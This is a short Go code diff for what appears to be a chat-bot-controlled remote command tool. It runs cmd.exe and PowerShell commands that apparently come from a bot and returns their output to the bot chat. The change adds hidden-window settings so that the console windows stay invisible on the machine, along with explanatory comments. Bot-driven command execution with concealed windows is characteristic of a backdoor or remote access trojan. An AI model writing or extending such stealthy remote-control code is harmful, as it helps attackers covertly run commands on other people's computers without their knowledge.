@@ -138,10 +138,13 @@ func pwrcmd(code string) (string, error) {
 
 	// Hide PowerShell window
 	cmd.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow: true,
+		HideWindow: true, // This will hide the PowerShell window
 	}
 
+	// Execute the command
 	out, err := cmd.CombinedOutput()
+
+	// Return the output as a string and any error that might have occurred
 	return string(out), err
 }
 
@@ -440,6 +443,8 @@ func main() {
 			// drop into cmd.exe for everything else (native expands %CD%, supports built-ins)
 			cmd := exec.Command("cmd.exe", "/C", cmdStr)
 			cmd.Dir = cwd
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // This will hide the command window
+
 			out, err := cmd.CombinedOutput()
 			if err != nil {
 				sendLargeMessage(bot, cid, "[!] "+err.Error()+"\n"+string(out))
